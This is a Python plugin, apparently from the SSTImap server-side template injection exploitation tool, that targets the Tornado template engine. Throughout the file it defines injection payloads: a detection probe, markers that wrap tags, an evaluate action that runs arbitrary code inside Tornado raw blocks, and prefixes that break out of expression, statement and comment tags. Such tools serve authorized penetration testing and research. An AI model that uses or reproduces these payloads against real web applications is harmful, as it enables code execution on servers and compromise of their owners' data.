from plugins.languages import python
from utils import rand


class Tornado(python.Python):
    priority = 5
    generic_plugin = True
    plugin_info = {
        "Description": """Template engine of the Tornado web framework""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "References": [
            "Research: https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/",
        ],
        "Engine": [
            "Homepage: https://www.tornadoweb.org/en/stable/template.html",
            "Github: https://github.com/tornadoweb/tornado/blob/master/tornado/template.py",
        ],
    }
    
    def init(self):

        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                'test_render': f"""{{{{'{rand.randstrings[0]}'}}}}{{#comment#}}{{% raw '{rand.randstrings[0]}'.join('{rand.randstrings[1]}') %}}{{{{'{rand.randstrings[1]}'}}}}""",
                'test_render_expected': f'{rand.randstrings[0] + rand.randstrings[0].join(rand.randstrings[1]) + rand.randstrings[1]}'
            },
            'evaluate': {
                # Using raw blocks to check for actual Tornado syntax
                'evaluate': """{{% raw {code} %}}"""
            }
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # This covers {{%s}}
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '', 'closures': python.ctx_closures},
            # This covers {% %s %}
            {'level': 1, 'prefix': '{closure}%}}', 'suffix': '', 'closures': python.ctx_closures},
            # Comment blocks
            {'level': 5, 'prefix': '#}}', 'suffix': '{#'},
        ])

